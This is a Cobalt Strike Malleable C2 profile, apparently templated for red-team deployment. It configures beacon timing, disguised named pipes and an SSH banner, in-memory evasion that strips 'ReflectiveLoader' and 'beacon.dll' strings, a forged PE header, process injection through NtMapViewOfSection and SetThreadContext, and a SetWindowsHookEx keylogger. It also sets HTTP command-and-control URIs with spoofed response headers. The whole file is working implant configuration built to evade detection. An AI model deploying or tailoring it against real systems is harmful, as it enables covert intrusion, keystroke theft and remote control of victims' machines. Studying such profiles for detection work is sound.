set host_stage "false";
set sleeptime "57000";
set jitter    "67";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36";

set data_jitter "46";
set smb_frame_header "";
set pipename "epmapper-3607";
set pipename_stager "epmapper-5260";

set tcp_frame_header "";
set ssh_banner "Welcome to Ubuntu 19.10.0 LTS (GNU/Linux 4.4.0-19037-aws x86_64)";
set ssh_pipename "epmapper-##";


####Manaully add these if your doing C2 over DNS (Future Release)####
##dns-beacon {
#    set dns_idle             "1.2.3.4";
#    set dns_max_txt          "199";
#    set dns_sleep            "1";
#    set dns_ttl              "5";
#    set maxdns               "200";
#    set dns_stager_prepend   "doc-stg-prepend";
#    set dns_stager_subhost   "doc-stg-sh.";

#    set beacon               "doc.bc.";
#    set get_A                "doc.1a.";
#    set get_AAAA             "doc.4a.";
#    set get_TXT              "doc.tx.";
#    set put_metadata         "doc.md.";
#    set put_output           "doc.po.";
#    set ns_response          "zero";

#}

################################################
## Task and Proxy Max Size
################################################
## Description:
##    Added in CS4.6
##    Control how much data (tasks and proxy) is transferred through a communication channel
## Defaults:
##    tasks_max_size "1048576";         # 1 MB
##    tasks_proxy_max_size "921600";    # 900 KB
##    tasks_dns_proxy_max_size "71680"; # 70 KB
## Guidelines
##    - For tasks_max_size determine the largest task that will be sent to your target(s).
##      This setting is patched into beacon when it is generated, so the size
##      needs to be determined prior to generating beacons for your target(s).
##      If a beacon within a communication chain does not support the received task size
##      it will be ignored.
##    - It is recommended to not modify the proxy max sizes
##
set tasks_max_size "2097152"; # Changed to 2 MB to support larger assembly files
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";  

stage {
    set obfuscate "true";
    set stomppe "true";
    set cleanup "true";
    set userwx "false";
    set smartinject "false";
    set module_x64 "xpsservices.dll";
    
    #TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
    #They will also obfuscate themselves while they wait to read information from their parent Beacon.
    set sleep_mask "true";
    
    set checksum       "1968945";
    set compile_time   "26 Jul 2022 18:09:30";
    set entry_point    "1099888";
    set image_size_x86 "2072576";
    set image_size_x64 "2072576";
    set name           "InProcessClient.dll";
    set rich_header    "\xd5\x71\x0e\xb3\x91\x10\x60\xe0\x91\x10\x60\xe0\x91\x10\x60\xe0\x85\x7b\x63\xe1\x84\x10\x60\xe0\x85\x7b\x65\xe1\x24\x10\x60\xe0\x48\x64\x64\xe1\x83\x10\x60\xe0\x48\x64\x63\xe1\x9d\x10\x60\xe0\xf7\x7f\x9d\xe0\x92\x10\x60\xe0\x4a\x64\x61\xe1\x93\x10\x60\xe0\x85\x7b\x64\xe1\xb2\x10\x60\xe0\x85\x7b\x61\xe1\x94\x10\x60\xe0\x48\x64\x65\xe1\x0e\x10\x60\xe0\xfb\x78\x65\xe1\x80\x10\x60\xe0\x85\x7b\x66\xe1\x93\x10\x60\xe0\x91\x10\x61\xe0\x5c\x11\x60\xe0\x4a\x64\x69\xe1\x03\x10\x60\xe0\x4a\x64\x63\xe1\x93\x10\x60\xe0\x4a\x64\x60\xe1\x90\x10\x60\xe0\x4a\x64\x9f\xe0\x90\x10\x60\xe0\x91\x10\xf7\xe0\x90\x10\x60\xe0\x4a\x64\x62\xe1\x90\x10\x60\xe0\x52\x69\x63\x68\x91\x10\x60\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    
    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
    

        }
}

process-inject {
    # set remote memory allocation technique
    set allocator "NtMapViewOfSection";

    # shape the content and properties of what we will inject
    set min_alloc "49892";
    set userwx    "false";
    set startrwx "true";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    # specify how we execute code in the remote process
    execute {
        SetThreadContext;
        RtlCreateUserThread;
    }
}

post-ex {
    # control the temporary process we spawn to
    
    set spawnto_x86 "%windir%\\syswow64\\backgroundtaskhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\backgroundtaskhost.exe";

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
 
    # pass key function pointers from Beacon to its child jobs
    set smartinject "false";
 
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "false";
    
    # control the method used to log keystrokes 
    set keylogger "SetWindowsHookEx";

    set thread_hint "kernel32!WaitForSingleObject";
}

    
http-config {
    #set "true" if teamserver is behind redirector
    set trust_x_forwarded_for "true";           
}
http-get {

set uri "/e15e3793/";

client {
    header "{{ cs_auth_header_name }}" "{{ cs_auth_header_value }}";
    metadata {
        mask;
        netbios;
        uri-append;
    }
}

server {
    header "X-Content-Type-Options" "nosniff";
    header "X-XSS-Protection" "1; mode=block";
    header "X-Frame-Options" "SAMEORIGIN";
    header "Cache-Control" "public,max-age=14241626";
    header "Age" "1333";
    header "Alternate-Protocol" "80:quic";

    output {
        print;
    }
}
}

http-post {

set uri "/9ff38a03/";

client {
    header "{{ cs_auth_header_name }}" "{{ cs_auth_header_value }}";

    id {
        mask;
        netbios;
        uri-append;
    }

    output {
        print;
    }
}

server {
    header "X-Content-Type-Options" "nosniff";
    header "X-XSS-Protection" "1; mode=block";
    header "X-Frame-Options" "SAMEORIGIN";
    header "Cache-Control" "public,max-age=14241626";
    header "Age" "1333";
    header "Alternate-Protocol" "80:quic";
    output {
        print;
    }
}
}
